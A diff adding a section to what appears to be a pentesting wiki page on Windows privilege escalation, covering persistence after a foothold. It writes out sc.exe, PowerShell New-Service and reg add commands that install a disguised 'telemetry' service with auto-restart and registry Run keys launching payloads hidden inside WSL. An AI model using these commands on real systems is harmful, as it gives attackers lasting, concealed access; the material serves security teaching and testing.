@@ -739,6 +739,39 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 privilege-escalation-with-autorun-binaries.md
 {{#endref}}
 
+### Persistence (service installs + WSL autoruns)
+
+Metasploit 6.4.99 added two persistence modules that encapsulate common tradecraft for keeping Windows access after an initial foothold: `windows/persistence/service` (now powered by a dedicated mixin) and `windows/persistence/wsl/registry`. Even without Metasploit, the same primitives are easy to reproduce manually and pair well with the autorun paths listed above.
+
+#### Service-based persistence via PowerShell/sc.exe
+
+1. Drop or stage the payload (EXE, PowerShell stager, `cmd.exe /c wscript ...`, etc.) into a path writable by the current integrity level.
+2. Create a service whose `ImagePath` points to that payload. The Metasploit module can now do this with either native PowerShell cmdlets or classic `sc.exe` invocations:
+
+```powershell
+# PowerShell backend
+New-Service -Name "WinTelemetrySvc" -BinaryPathName "C:\ProgramData\winsvc\beacon.exe" -StartupType Automatic -Description "Telemetry";
+Set-Service -Name "WinTelemetrySvc" -Status Running
+
+# sc.exe backend
+sc.exe create WinTelemetrySvc binPath= "cmd.exe /c C:\ProgramData\winsvc\payload.exe" start= auto DisplayName= "Windows Telemetry";
+sc.exe failure WinTelemetrySvc reset= 60 actions= restart/0/restart/0
+```
+
+3. Trigger the service once (or rely on `start= auto`) and optionally set recovery actions so SCM re-launches it after crashes.
+
+#### WSL-backed Run/RunOnce persistence
+
+`windows/persistence/wsl/registry` writes `Run/RunOnce` entries that execute `wsl.exe` so the real payload can live inside a Linux distribution (e.g., `~/.local/bin/revshell`). This hides the tooling inside the EXT4 VHDX while only exposing a short `wsl.exe -d DISTRO` command in the registry. Manual setup looks like this:
+
+```cmd
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WSLUpdater /t REG_SZ /d "wsl.exe -d Ubuntu-22.04 /home/user/payload.sh" /f
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SystemWSL /t REG_SZ /d "wsl.exe -d Ubuntu-22.04 /home/root/systemd-run /root/payload.sh" /f
+```
+
+- `HKCU` entries fire at the next logon of the compromised user.
+- `HKLM` entries (if writable) execute at boot under SYSTEM, giving the attacker code execution before interactive logons.
+
 ### Drivers
 
 Look for possible **third party weird/vulnerable** drivers
@@ -1890,5 +1923,6 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 - [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
 
 - [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
+- [Rapid7 – Metasploit Wrap-Up 11/21/2025](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-11-21-2025/)
 
 {{#include ../../banners/hacktricks-training.md}}
